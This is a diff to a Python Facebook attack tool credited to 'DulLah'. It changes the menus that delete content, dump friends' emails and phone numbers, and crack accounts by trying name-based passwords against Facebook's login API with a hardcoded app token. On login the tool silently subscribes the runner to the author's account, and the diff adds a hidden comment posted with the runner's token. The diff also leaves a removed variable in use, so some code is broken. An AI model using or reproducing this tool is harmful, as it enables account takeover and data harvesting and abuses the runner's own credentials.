@@ -13,6 +13,7 @@ p='\033[1;97m' #putih
 m='\033[1;91m' #merah
 h='\033[1;92m' #hijau
 k='\033[1;93m' #kuning
+B='\033[1;96m' #biru
 
 #### URL ####
 url='https://graph.facebook.com/'
@@ -28,14 +29,14 @@ def lunga(s):
 		time.sleep(0.05)
 
 #### LOGO ####
-logo=(p+'''
-'''+h+'''    ╭◑❖◢◤◥◣◢◤◥◣◢◣◢◣◢◣◢◣◢◣◢◤◥◣◢◤◥◣❖◐╮ 
-'''+h+'''    ║╭✿'''+p+'''   ╔╗ ╔═╗╔╦╗  ╔═╗╔═╗╦ ╦'''+h+'''   ✿╮║
-'''+h+'''    ║  '''+p+'''   ╠╩╗║ ║ ║   ╠═╣╚═╗║ ║'''+h+'''     ║
-'''+h+'''    ║╰✿'''+p+'''   ╚═╝╚═╝ ╩   ╩ ╩╚═╝╚═╝'''+h+'''   ✿╯║
-'''+h+'''    ╰◑❖◥◣◢◤◥◣◢◤◥◤◥◤◥◤◥◤◥◤◥◣◢◤◥◣◢◤❖◐╯
-'''+m+'''            Coded by DulLah
-'''+k+'''    https://www.facebook.com/DulahZX
+logo=(B+'''
+    ____        __                     
+   / __ )____  / /_   ____ ________  __
+  / __  / __ \/ __/  / __ `/ ___/ / / /
+ / /_/ / /_/ / /_   / /_/ (__  ) /_/ / 
+/_____/\____/\__/   \__,_/____/\__,_/  
+'''+h+'''\n︻╦̵̵͇̿̿̿̿╤─────メ '''+m+'''Coded By DulLah'''+h+''' メ─────╦̵̵͇̿̿̿̿╤︻
+'''+h+'''       (►_◄) '''+k+'''Fb.me/DulahZ'''+h+''' (►_◄)
 ''')
 
 ok=[]
@@ -61,17 +62,17 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	print(m+'\n['+h+'✓'+m+']'+p+' Name '+h+ok['name'])
+	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+ok['name'])
 	print(p+40*'_')
-	print(m+'\n['+p+'01'+m+']'+p+' Delete all post')
-	print(m+'['+p+'02'+m+']'+p+' Delete albums')
-	print(m+'['+p+'03'+m+']'+p+' Delete all photo in albums')
-	print(m+'['+p+'04'+m+']'+p+' Delete all friend')
-	print(m+'['+p+'05'+m+']'+p+' Stop following all friend')
-	print(m+'['+p+'06'+m+']'+p+' Dump email')
-	print(m+'['+p+'07'+m+']'+p+' Dump phone numbers')
-	print(m+'['+p+'08'+m+']'+p+' Hack facebook '+m+'< '+h+'masal'+m+' >')
-	print(m+'['+p+'00'+m+'] Exit the program')
+	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete all post')
+	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Delete albums')
+	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Delete all photo in albums')
+	print(m+'('+h+'●'+m+') '+p+'04.'+k+' Delete all friend')
+	print(m+'('+h+'●'+m+') '+p+'05.'+k+' Stop following all friend')
+	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Dump email from your friend')
+	print(m+'('+h+'●'+m+') '+p+'07.'+k+' Dump phone numbers from your friend')
+	print(m+'('+h+'●'+m+') '+p+'08.'+k+' Hack facebook '+m+'< '+h+'masal'+m+' >')
+	print(m+'('+h+'●'+m+') '+m+'00. Exit the program')
 	z=input('\n'+p+'>>> ')
 	if z=='':
 		print(m+'[!] Wrong input')
@@ -319,10 +320,10 @@ def menumbf():
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	print(m+'\n['+p+'01'+m+']'+p+' Crack from list friend')
-	print(m+'['+p+'02'+m+']'+p+' Crack from friend')
-	print(m+'['+p+'03'+m+']'+p+' Crack from member group')
-	print(m+'['+p+'00'+m+'] Exit')
+	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Crack from list friend')
+	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Crack from friend')
+	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Crack from member group')
+	print(m+'('+h+'●'+m+') '+m+'00. Back')
 	e=input('\n'+p+'>>> ')
 	if e=='':
 		print(m+'[!] Wrong input')
@@ -331,7 +332,7 @@ def menumbf():
 	elif e=='1' or e=='01':
 		os.system('clear')
 		print(logo)
-		print(p+40*'_')
+		print(p+40*'_'+'\n')
 		oh=s.get(url+'me/friends?access_token='+token).json()
 		for o in oh['data']:
 			id.append(o['id'])
@@ -352,6 +353,15 @@ def menumbf():
 	elif e=='3' or e=='03':
 		os.system('clear')
 		print(logo)
+		print(m+'[ '+h+'Your group lists'+m+' ]'+'\n')
+		ze=s.get(url+'me/groups?access_token='+token).json()
+		for v in ze['data']:
+			print(p+40*'-')
+			print(m+'*'+p+'Name'+m+' >> '+p+v['name'])
+			print(m+'*'+p+'ID'+m+'   >> '+p+v['id'])
+			print(p+40*'-')
+		else:
+			print(m+'[!] No group lists')
 		print(p+40*'_')
 		gr=input(m+'\n['+p+'+'+m+']'+h+' Id group '+p+': ')
 		try:
@@ -379,16 +389,14 @@ def menumbf():
 		user=asw
 		try:
 			ya=s.get(url+user+'/?access_token='+token).json()
-			r=s.get(url+user+'/subscribers?access_token='+token).json()
-			sub=str(r['summary']['total_count'])
 			pas1=ya['first_name']+'123'
 			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 			if 'access_token' in b:
-				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1+m+' >> '+p+sub)
+				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1)
 				ok.append(user+pas1)
 			else:
 				if 'www.facebook.com' in b['error_msg']:
-					print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas1+m+' >> '+p+sub)
+					print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas1)
 					cp.append(user+pas1)
 					c=open('result/cp.txt','a')
 					c.write(user+' | '+pas1+' >> '+sub+'\n')
@@ -397,11 +405,11 @@ def menumbf():
 					pas2=ya['last_name']+'123'
 					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 					if 'access_token' in b:
-						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2+m+' >> '+p+sub)
+						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2)
 						ok.append(user+pas2)
 					else:
 						if 'www.facebook.com' in b['error_msg']:
-							print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas2+m+' >> '+p+sub)
+							print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas2)
 							cp.append(user+pas2)
 							c=open('result/cp.txt','a')
 							c.write(user+' | '+pas2+' >> '+sub+'\n')
@@ -410,11 +418,11 @@ def menumbf():
 							pas3=ya['first_name']+'12345'
 							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 							if 'access_token' in b:
-								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3+m+' >> '+p+sub)
+								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3)
 								ok.append(user+pas3)
 							else:
 								if 'www.facebook.com' in b['error_msg']:
-									print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas3+m+' >> '+p+sub)
+									print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas3)
 									cp.append(user+pas3)
 									c=open('result/cp.txt','a')
 									c.write(user+' | '+pas3+' >> '+sub+'\n')
@@ -459,11 +467,11 @@ if __name__=='__main__':
 			result.close()
 			if 'access_token' in ok:
 				token=open('result/token.txt','r').read()
-				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post('https://graph.facebook.com/DulahZX/subscribers?access_token='+token)
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post('https://graph.facebook.com/DulahZ/subscribers?access_token='+token);s.post("https://graph.facebook.com/100005584243934_1145924785603652/comments?message=Keren❤️&access_token="+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
-			print(m+'['+p+'×'+m+'] Error please cek your account and try again')
+			print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
 			os.system('rm -rf result/token.txt')
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
